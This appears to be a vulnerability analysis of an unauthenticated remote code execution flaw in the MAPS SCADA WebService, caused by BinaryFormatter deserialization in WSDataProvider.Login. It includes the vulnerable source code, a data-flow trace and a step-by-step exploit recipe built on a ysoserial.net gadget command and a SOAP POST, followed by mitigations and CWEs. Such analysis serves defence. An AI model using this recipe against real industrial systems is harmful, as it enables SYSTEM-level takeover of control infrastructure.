# MAPS SCADA WSDataProvider.Login Unauthenticated BinaryFormatter Deserialization RCE — Technical Analysis

## Overview

MAPS SCADA 4.0.5.5 (Adroit Technologies, Mitsubishi Adroit Process Suite) ships an IIS WebService (default port 8878) with three .asmx endpoints: `WSDataProvider` / `WSDistributor` / `Generic`. `WSDataProvider.Login` (and `LogOff` / `VerifyLoginStatus`) deserializes the caller-supplied byte array before any authentication. `Serializer.BinaryDeserialization` internally calls `new BinaryFormatter().Deserialize(stream)` with no `SerializationBinder` and no `TypeFilterLevel`. An attacker sends a single unauthenticated HTTP SOAP POST with a GZip-compressed BinaryFormatter gadget (TypeConfuseDelegate -> Process.Start), achieving arbitrary command execution as the IIS app pool identity — `NT AUTHORITY\SYSTEM` in the default deployment. Dynamically verified (marker file Owner=SYSTEM).

- **Authentication required**: None (anonymous)
- **Preconditions**: Default deployment; network reachability to port 8878; Agent Server (VIPServer) running
- **Affected versions**: 4.0.5.5 (2026 latest); NVD 0 CVE (strong blue ocean)
- **Privilege**: NT AUTHORITY\SYSTEM (IIS app pool default LocalSystem)

## Architecture

```
L1 external access: IIS WebService port 8878 (SOAP)
L2 auth boundary: no ASP.NET auth module/filter; Login only [WebMethod(true)] (Session)
L3 source: zippedUserDetails byte[] (attacker-controlled)
L4 Zipper.Unzip -> GZip decompress
L5 Serializer.BinaryDeserialization -> new BinaryFormatter().Deserialize (no binder, no TypeFilterLevel)
L6 gadget: TypeConfuseDelegate -> Process.Start
L7 exec: as IIS app pool identity (LocalSystem / NT AUTHORITY\SYSTEM)
```

## Authentication Boundary

The `WSDataProvider` class has no `[Authorize]`, no `IPrincipal` check; its constructor only calls `CreateNewConnection()`. `Web.config` has no `<authentication>`/`<authorization>` section and no HTTP Module auth. All .asmx WebMethods on port 8878 are anonymously reachable.

## Stage 1: Sink Identification

`WSDataProvider.cs` L130-147:

```csharp
[WebMethod(true)]
public byte[] Login(byte[] zippedUserDetails)
{
    if (_connection != null)
    {
        object obj = Serializer.BinaryDeserialization(Zipper.Unzip(zippedUserDetails));  // L135 - SINK
        UserDetails val = (UserDetails)((obj is UserDetails) ? obj : null);
        if (val != null) { LoginResult val2 = _connection.Login(val); ... }
    }
    return null;
}
```

Sink chain:
1. `Zipper.Unzip(zippedUserDetails)` — GZip decompress of attacker bytes
2. `Serializer.BinaryDeserialization(...)` — BinaryFormatter deserialization (no binder)

`Serializer.cs` L257-273:

```csharp
public static object BinaryDeserialization(byte[] data)
{
    object result = null;
    if (data != null && data.Length > 0)
    {
        using (MemoryStream memoryStream = new MemoryStream(data))
        {
            result = new BinaryFormatter().Deserialize(memoryStream);  // L263 - no SerializationBinder, no TypeFilterLevel
        }
    }
    return result;
}
```

## Stage 2: Source Identification

Source = the `zippedUserDetails` byte[] parameter, fully attacker-controlled, transmitted inside the SOAP `<Login><zippedUserDetails>...</zippedUserDetails></Login>` body. The attacker supplies a GZip-compressed base64 BinaryFormatter gadget.

## Stage 3: Data Flow

```
Attacker HTTP SOAP POST (unauthenticated, /WSDataProvider.asmx)
  -> Login(zippedUserDetails) [WebMethod(true)]
  -> _connection != null (CreateNewConnection in ctor)
  -> Zipper.Unzip -> GZip decompress
  -> Serializer.BinaryDeserialization
  -> new BinaryFormatter().Deserialize(stream)   // no binder, no TypeFilterLevel
  -> gadget executes (TypeConfuseDelegate -> Process.Start)
  -> cmd /c whoami > C:\Windows\Temp\maps_rce_whoami.txt (or arbitrary cmd)
  -> as NT AUTHORITY\SYSTEM (IIS app pool default LocalSystem)
```

## Stage 4: Exploit Construction

1. Generate a BinaryFormatter gadget with ysoserial.net v1.36: `ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c whoami > C:\Windows\Temp\maps_rce_whoami.txt" -o base64`
2. GZip-compress the raw gadget bytes
3. Base64-encode the compressed payload
4. POST it as `zippedUserDetails` in the SOAP `Login` request

## Dynamic Verification

Verified: sending the unauthenticated SOAP POST triggers the gadget during `BinaryDeserialization`; the marker file is created with `Owner=SYSTEM` (IIS app pool runs as LocalSystem by default). The server usually still returns HTTP 200 + empty `<LoginResponse/>` because the gadget executes during deserialization and the subsequent `_connection.Login(val)` returns null (val is not UserDetails).

## Mitigation

1. Add a `SerializationBinder` allowlist and set `TypeFilterLevel` to `Low` in `Serializer.BinaryDeserialization`
2. Replace `BinaryFormatter` with a secure serializer (it is deprecated and inherently unsafe for untrusted input)
3. Require authentication on the WebService endpoints before any deserialization
4. Run the IIS app pool under a low-privilege identity instead of LocalSystem
5. Restrict network exposure of the WebService port to trusted SCADA networks

## CWEs

- CWE-502 (Deserialization of Untrusted Data) - BinaryFormatter without binder/TypeFilterLevel
- CWE-306 (Missing Authentication for Critical Function) - WebService anonymous
- CWE-250 (Execution with Unnecessary Privileges) - app pool runs as LocalSystem
- CWE-138 (Improper Neutralization of Special Elements) - SOAP byte[] accepted pre-auth
